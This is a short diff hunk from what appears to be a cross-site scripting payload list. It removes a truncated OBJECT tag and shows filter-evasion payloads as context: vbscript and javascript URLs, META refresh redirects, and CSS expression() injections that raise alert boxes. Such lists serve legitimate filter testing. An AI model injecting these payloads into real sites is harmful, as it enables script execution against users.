@@ -18,7 +18,6 @@ exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pressi
 <IMG SRC='vbscript:msgbox("CrossSiteScriptingAcademia")'>
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScriptingAcademia');">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScriptingAcademia');">
-<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f
 <IMG STYLE="xss:expr/*XSS*/ession(alert('CrossSiteScriptingAcademia'))">
 <XSS STYLE="xss:expression(alert('CrossSiteScriptingAcademia'))">
 <STYLE>.XSS{background-image:url("javascript:alert('CrossSiteScriptingAcademia')");}</STYLE><A CLASS=XSS></A>
